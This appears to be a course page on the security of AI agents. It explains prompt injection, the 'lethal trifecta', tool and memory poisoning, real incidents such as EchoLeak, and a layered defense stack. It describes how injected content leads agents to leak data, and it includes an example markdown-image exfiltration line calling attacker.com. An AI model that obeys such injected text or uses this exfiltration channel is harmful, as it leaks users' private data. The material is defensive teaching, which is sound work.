Security

The attacks and the defenses. The uncomfortable headline of 2026: prompt injection is not solved — so you architect so that injection can’t cause harm, rather than hoping to block it.
~12 min read · 1 exercise at the end
The one idea on this page An LLM has no notion of untrusted content — instructions and data are the same stream of tokens. So text an agent reads (a web page, an email, a tool result) can become instructions it obeys. There is no reliable filter for this. The 2026 consensus shifted from “detect and block injections” to “design so a successful injection is harmless” — and the organizing rule is the lethal trifecta.

1.The lethal trifecta

Simon Willison’s framing is the lens the whole field now uses. An agent becomes a data-theft weapon when it simultaneously has all three of:

Hold all three at once → an injection in the untrusted content can read your private data and mail it out. Remove any one circle and the data-theft path is broken.

Meta operationalized this as the Agents Rule of Two: a session should hold at most two of the three. Need all three for a task? Then it can’t run autonomously — put a human on the dangerous edge. This is the single highest-leverage design decision on this page.

2.The attack taxonomy

1

Direct vs. indirect injection

Direct = the user types adversarial instructions. Indirect = the instructions ride in on content the agent ingests doing a legit task (a web page, a PDF, a GitHub issue, a tool result). Indirect is the dominant agentic threat because the user is innocent and unaware.

2

Injection ≠ jailbreak

A jailbreak attacks the model’s safety policy (elicit disallowed output). An injection attacks the application’s trust boundary (override developer instructions, misuse tools). In agents, injection is the higher-impact class — it turns real tools into weapons.

3

Tool poisoning & the supply chain

A malicious MCP tool hides instructions in its description, which the harness feeds verbatim into context (Topic 4’s warning, realized). “Rug pulls” redefine a tool after you approve it. Extends to poisoned skills and IDE extensions — a 2026 skills marketplace was found ~12% compromised.

4

Memory poisoning — the attack that waits

Malicious content written into persistent memory/RAG (Topic 2b) corrupts future sessions, not just the current one. Research shows >80% success at <0.1% poison rate. And in multi-agent systems (Topic 5), one compromised agent injects the others — a simulated cascade corrupted 87% of downstream decisions in 4 hours.

The canonical exfiltration channel: a markdown image. If the agent can render ![](attacker.com/x?data=SECRET), the browser auto-fetches it and your data is in the URL. Links, DNS lookups, and any outbound tool call work the same way — that’s the third circle. The OWASP Top 10 for Agentic Applications 2026 (ASI01–10) is the fuller catalog.

3.Incidents that defined the threat

EchoLeak (CVE-2025-32711, CVSS 9.3): the first real-world zero-click injection in a production LLM system (Microsoft 365 Copilot). One crafted email with a hidden prompt; when the user later asks Copilot anything, retrieval pulls the email into context and the payload exfiltrates internal data via an auto-fetched markdown image — no user interaction. It defeated Microsoft’s injection classifier, link redaction, and CSP. The trifecta blueprint, in the wild.
Amazon Q for VS Code: an attacker merged a data-wiping prompt into the official v1.84.0 of an extension with 964k+ installs; it was live ~2 days and failed only on a syntax error. The root cause was an over-permissioned token — the Topic 6 lesson: one god-mode credential is a whole-supply-chain compromise.
GitHub MCP exploit: a malicious GitHub issue hijacked an agent connected to the official GitHub MCP server and walked private-repo data into an attacker-visible PR. No server bug needed — just the agent’s over-broad reach plus untrusted input.

4.Why classifiers can’t save you

The instinct is to build a detector for injections. Two 2025 results reset the field:

!

“The Attacker Moves Second”

Anthropic, OpenAI, and DeepMind jointly tested 12 published defenses. Against static attack strings they looked great; against adaptive attackers they collapsed to >90% success, and a human red team hit 100% on all 12. Lesson: static-benchmark scores are “almost useless” — near-0% means nothing unless the attacker was adaptive.

%

95% caught is a failing grade

Willison’s rule: a security filter that stops 95% of attacks is a failure, because an adversary simply retries until the 5% lands. Spam filters can be 95% good; security boundaries cannot. Classifiers and delimiters (“spotlighting”) are defense-in-depth layers, never the boundary.

What actually works is structural. The promising direction constrains untrusted input so it cannot trigger consequential actions — e.g. the dual-LLM / CaMeL pattern: a privileged model plans and wields tools but never sees untrusted data; a quarantined model reads untrusted data but has no tools; a capability layer tracks each value’s provenance so tainted data can’t reach a dangerous sink. It blocked ~67% of a standard attack suite out of the box, at ~2.7× token cost. This is Topic 5’s orchestration in service of security.

5.The defense stack a harness designer builds

In priority order — and note that layers 1–4 hold even against a fully adaptive attacker, while classifiers are additive only:

1

Rule of Two as an invariant

For every tool config, check the three circles. All three present and autonomous? Redesign or add a human gate. This decision beats every classifier you could add.

2

Break the trifecta by construction

Dual-LLM / plan-then-execute / context minimization — keep the tool-wielding path away from untrusted content; give the untrusted-content reader no tools.

3

Track provenance on tool arguments

Label every value’s source; block any sensitive or irreversible tool call whose arguments derive from untrusted content without passing an explicit sanitizer. Treat tool outputs as untrusted by default. (This is a Topic 8 guardrail with a taint label attached.)

4

Kill the egress vector

Strip remote images, disable auto-fetch, proxy all outbound through a domain allowlist, watch DNS. Removing the third circle alone defuses most data-theft trifectas — and it’s exactly what the Topic 6 sandbox proxy does.

5

Least privilege, pinning, and sandbox as last line

Per-tool scoped tokens (no shared god-mode key), pinned/vetted MCP servers with signed provenance, and — assuming injection lands — a sandbox that bounds the blast radius. Then test with adaptive red-team tools (PyRIT, AgentDojo, MCPTox), never static strings.

6.Try it — find your own trifecta

Exercise · ~10 minutes, thinking + Claude Code
  1. Audit a real setup: think about Claude Code on your interview-prep repo with a web-fetch tool enabled. Which of the three circles are lit? (Private data: your files. Untrusted content: any web page it fetches. Egress: the fetch tool itself.) That’s all three.
  2. Now break one: which single change most cheaply removes a circle? (Usually egress — deny WebFetch to arbitrary domains, allowlist only the ones you trust.)
  3. Spot the exfil channel: ask Claude to render a markdown image from an external URL in its output. It works — now imagine the URL carried your data. That’s EchoLeak’s mechanism at n=1.
  4. Connect it back: which earlier topics were secretly security defenses? (Topic 6 sandbox = egress control + blast radius; Topic 8 pre-tool guardrail = provenance gate; Topic 5 dual-LLM = trifecta break.) Security isn’t a bolt-on — it’s the whole course from a threat angle.
